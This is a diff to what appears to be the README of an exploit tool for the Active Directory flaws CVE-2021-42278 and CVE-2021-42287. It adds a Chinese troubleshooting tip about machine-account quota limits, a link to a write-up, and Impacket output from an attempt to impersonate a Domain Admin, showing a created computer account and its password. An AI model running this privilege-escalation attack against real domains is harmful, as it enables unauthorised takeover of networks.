@@ -234,6 +234,28 @@ new_computer_name = f"DESKTOP-{''.join(random.sample(string.ascii_letters + stri
 ![image](https://user-images.githubusercontent.com/16593068/146152468-8fae7118-c231-4daf-8e0b-d2c7ead85647.png)
 
 
+一个账号可以打10次，然后就失败了, 解决版本： 把机器名删掉即可。
+
+https://cloudbrothers.info/en/exploit-kerberos-samaccountname-spoofing/
+
+![image](https://user-images.githubusercontent.com/16593068/146154132-25debdd7-e9df-4d9a-bb08-f89014fb591e.png)
+
+
+```bash
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] Selected Target dc01.jas502n.com
+[*] Total Domain Admins 1
+[*] will try to impersonat Administrator
+[*] Current ms-DS-MachineAccountQuota = 10
+[*] Adding Computer Account "DESKTOP-VTBspLr$"
+[*] MachineAccount "DESKTOP-VTBspLr$" password = JpVlTU*P2Y@#
+[-] User hr machine quota exceeded!
+[-] Machine not found in LDAP: DESKTOP-VTBspLr$
+Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)
+```
+
+
 
 Exploiting CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user 
 
